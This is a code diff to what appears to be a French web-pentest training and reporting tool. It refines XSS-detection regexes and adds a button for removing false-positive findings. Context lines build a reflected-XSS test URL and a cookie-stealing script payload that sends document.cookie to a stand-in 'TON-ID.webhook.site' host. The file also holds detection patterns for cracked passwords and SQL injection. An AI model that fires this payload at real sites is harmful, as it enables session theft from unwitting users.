@@ -52,8 +52,8 @@
 </head>
 <body>
 <div class="wrap">
-  <h1>🥋 Mode MANUEL guidé — tu exécutes, tu apprends <span style="font-size:12px;font-weight:700;background:#1f2937;color:#f59e0b;padding:3px 8px;border-radius:6px;vertical-align:middle">v2026-11-03d</span></h1>
-  <p style="margin:4px 0 0;font-size:12px;color:#9aa0b0">Si le badge de version n'est pas <b>v2026-11-03d</b> : fais <b>SYNC GitHub</b> puis recharge avec <b>Ctrl+Maj+R</b> (vide le cache). Tu verras alors les vraies commandes partout (upload, reset/session, JWT…).</p>
+  <h1>🥋 Mode MANUEL guidé — tu exécutes, tu apprends <span style="font-size:12px;font-weight:700;background:#1f2937;color:#f59e0b;padding:3px 8px;border-radius:6px;vertical-align:middle">v2026-11-03e</span></h1>
+  <p style="margin:4px 0 0;font-size:12px;color:#9aa0b0">Si le badge de version n'est pas <b>v2026-11-03e</b> : fais <b>SYNC GitHub</b> puis recharge avec <b>Ctrl+Maj+R</b> (vide le cache). Tu verras alors les vraies commandes partout (upload, reset/session, JWT…).</p>
   <div style="background:#0b0d13;border:1px solid #2a2c4e;border-radius:10px;padding:12px 14px;margin:8px 0 4px">
     <div style="font-weight:800;color:#E6A93C;margin-bottom:4px">Comment ça marche — 3 étapes</div>
     <div style="font-size:13px;color:#c7cdda;line-height:1.7">
@@ -912,10 +912,13 @@ function scan(t){
     report:{type:'info'}, unlock:null};
   // ===== XSS : la charge injectée est-elle RENVOYÉE/EXÉCUTÉE (non échappée) ? =====
   // Charge BRUTE (vrai < non encodé) dans la sortie = le navigateur l'exécute = XSS confirmée.
-  var xssRaw = /<svg[\s\/][^>]*onload\s*=|<script>\s*alert|<img[^>]*onerror\s*=|"><\s*(svg|script|img)\b/i;
+  // XSS confirmée UNIQUEMENT si la charge de TEST injectée est renvoyée telle quelle :
+  // marqueurs distinctifs alert(1337)/alert(document.domain), ou <svg/<img ... onload/onerror=alert(.
+  // Une page normale (avec <script>/<svg> légitimes) ne matche PLUS → fini les faux positifs.
+  var xssRaw = /alert\(1337\)|alert\(document\.domain\)|<svg[\s\/][^>]*onload\s*=\s*alert\(|<img[^>]*onerror\s*=\s*alert\(/i;
   if(xssRaw.test(raw)){
-    var xStored = /"><\s*(svg|img|script)|<svg\s+onload|<img\s+[^>]*onerror|stock|persist|commentaire|rechargement|autre utilisateur/i.test(raw);
-    var xRefl   = /<svg\/onload|[?&][a-z0-9_]+=<\s*(svg|script|img)/i.test(raw);
+    var xRefl   = /alert\(1337\)|<svg\/onload=alert\(/i.test(raw);
+    var xStored = /alert\(document\.domain\)|stock|persist|rechargement|autre utilisateur/i.test(raw);
     var xType = (xRefl && !xStored) ? 'xssr' : 'xss';
     var xOpenUrl = U+'/?'+P+'=<svg/onload=alert(1337)>';
     var xCookieUrl = U+'/?'+P+'=<script>new Image().src=\'https://TON-ID.webhook.site/?c=\'+document.cookie<\/script>';
@@ -1134,7 +1137,7 @@ function scanExtra(t){
   hit(/^[0-9A-F]{35}:\d+/m,'leak');                                   // mot de passe compromis (Pwned)
   hit(/Valid Combinations Found|\[SUCCESS\]|Username:\s*\S+,?\s*Password:\s*\S+|Password:\s*\S+|password found|credentials?\s+found|mot de passe (?:trouv|compromis|faible|cass)|login successful|weak password|default credentials/i,'auth'); // mdp cassé
   hit(/available databases|back-end DBMS|sqlmap identified|SQL injection|injection SQL|UNION[\s-]*based SQL|Parameter:\s*\S+\s*\((GET|POST)\)/i,'sqli');
-  hit(/<svg[\s\/][^>]*onload\s*=|<script>\s*alert|<img[^>]*onerror\s*=|onerror\s*=\s*alert|onload\s*=\s*alert/i,'xss');
+  hit(/alert\(1337\)|alert\(document\.domain\)|<svg[\s\/][^>]*onload\s*=\s*alert\(|<img[^>]*onerror\s*=\s*alert\(/i,'xss'); // marqueur de test requis → pas de faux positif sur page normale
   hit(/\[!\]\s*Title:|vulnerabilit|CVE-\d{4}/i,'cve');               // plugin/thème vulnérable
   hit(/ref:\s*refs\/heads|\.git\/HEAD/i,'info');                      // .git exposé
   hit(/account_exists|"slug"\s*:\s*"[^"]+"[\s\S]*"id"\s*:\s*\d+|\/author\/[a-z0-9_.-]+/i,'enum'); // comptes énumérés
@@ -1385,9 +1388,20 @@ function reportHeader(){
 }
 var REPORT_MODE='novice', _AG_RPT_T=null;
 function refreshReportSoon(){ try{ clearTimeout(_AG_RPT_T); }catch(e){} _AG_RPT_T=setTimeout(function(){ try{ if((window.FINDINGS||[]).length) buildReport(REPORT_MODE, true); }catch(e){} }, 250); }
+var LAST_F=[];
+function xBtn(i){ return '<span onclick="removeFindingAt('+i+')" title="Retirer cette faille (ex. faux positif)" style="float:right;cursor:pointer;color:#b91c1c;font-weight:700;font-size:12px">✕ retirer</span>'; }
+function removeFindingAt(i){
+  var f=LAST_F[i]; if(!f) return; var nm=(f.name||'')+'';
+  if(!confirm('Retirer « '+nm+' » du rapport et du site ? (à faire si c\'est un faux positif)')) return;
+  try{ FINDINGS=FINDINGS.filter(function(x){ return ((x.name||'')+'').trim().toLowerCase()!==nm.trim().toLowerCase(); }); }catch(e){}
+  try{ var host=(window.AGT&&AGT.T)||''; if(host){ agApi('ag_rap_finddrop','/ag/v1/find-drop','POST',{cible:host,name:nm}).then(function(){ try{ reloadJobsSoon(); }catch(e){} }).catch(function(){}); } }catch(e){}
+  try{ persistState(); }catch(e){}
+  try{ updateProgress(); }catch(e){}
+  try{ buildReport(REPORT_MODE, true); }catch(e){}
+}
 function buildReport(mode, noScroll){
   REPORT_MODE=mode;
-  var F=collectFindings(), box=document.getElementById('presentReport');
+  var F=collectFindings(), box=document.getElementById('presentReport'); LAST_F=F;
   if(!F.length){ box.innerHTML='<div style="padding:20px;color:#555">Aucune faille collectée pour l\'instant. Lance des analyses (ou remplis le rapport ci-dessus), puis regénère.</div>'; return; }
   var worst=F.reduce(function(m,f){var s=parseFloat(f.score)||0;return s>m?s:m;},0);
   var body='';
@@ -1402,7 +1416,7 @@ function buildReport(mode, noScroll){
     body+='<div style="padding:10px 24px 24px"><p style="color:#333;font-size:13px">Rapport technique — chaque faille suit le format standard (type, endpoint, CVSS, preuve masquée, remédiation).</p>';
     F.forEach(function(f,idx){ var s=sevInfo(f.score);
       body+='<div style="border:1px solid #e3e3e3;border-radius:8px;padding:14px;margin:14px 0">'+
-        '<div style="font-weight:800;font-size:15px;color:#141414">#'+(idx+1)+' — '+esc(f.name)+' <span style="color:'+s.c+'">('+s.l+' '+esc(''+f.score)+')</span></div>'+
+        '<div style="font-weight:800;font-size:15px;color:#141414">'+xBtn(idx)+'#'+(idx+1)+' — '+esc(f.name)+' <span style="color:'+s.c+'">('+s.l+' '+esc(''+f.score)+')</span></div>'+
         '<div style="font-size:12.5px;color:#444;margin-top:6px"><b>Endpoint :</b> <code>'+esc(f.endpoint||'—')+'</code></div>'+
         '<div style="font-size:12.5px;color:#444"><b>CVSS 3.1 :</b> <code>'+esc(f.cvss)+'</code> = '+esc(''+f.score)+'</div>'+
         (cweFor(f)?'<div style="font-size:12.5px;color:#444"><b>Classification :</b> <code>'+esc(cweFor(f))+'</code> <span style="color:#888">(référentiel MITRE CWE)</span></div>':'')+
@@ -1414,9 +1428,9 @@ function buildReport(mode, noScroll){
     var s0=sevInfo(worst);
     body+='<div style="display:flex;align-items:center;gap:18px;padding:18px 24px;border-bottom:1px solid #eee"><div style="font-size:44px;font-weight:900;color:'+s0.c+'">'+esc(''+worst)+'<span style="font-size:16px;color:#888">/10</span></div><div><div style="font-weight:800;color:'+s0.c+';font-size:16px">Gravité maximale : '+s0.l+'</div><div style="font-size:13px;color:#555">'+F.length+' point(s) de sécurité relevé(s). Détail ci-dessous, en clair.</div></div></div>';
     body+='<div style="padding:8px 24px 24px"><p style="color:#333;font-size:14px">Voici ce que nous avons trouvé sur votre site et ce que cela signifie concrètement pour vous. Chaque point est classé par gravité, avec notre recommandation.</p>';
-    F.forEach(function(f){ var s=sevInfo(f.score), nv=NOVICE[f.type]||{r:f.name,i:''};
+    F.forEach(function(f,idx){ var s=sevInfo(f.score), nv=NOVICE[f.type]||{r:f.name,i:''};
       body+='<div style="border:1px solid #eee;border-left:5px solid '+s.c+';border-radius:8px;padding:12px 14px;margin:12px 0">'+
-        '<div style="font-weight:800;color:'+s.c+'">'+s.l+' — '+esc(f.name)+'</div>'+
+        '<div style="font-weight:800;color:'+s.c+'">'+xBtn(idx)+s.l+' — '+esc(f.name)+'</div>'+
         '<div style="font-size:13.5px;color:#222;margin-top:5px"><b>Ce que c\'est :</b> '+esc(nv.r)+'</div>'+
         (nv.i?'<div style="font-size:13.5px;color:#222;margin-top:3px"><b>Le risque pour vous :</b> '+esc(nv.i)+'</div>':'')+
         '<div style="font-size:13.5px;color:#0a7a3f;margin-top:3px"><b>Notre recommandation :</b> '+esc(f.rem)+'</div></div>';
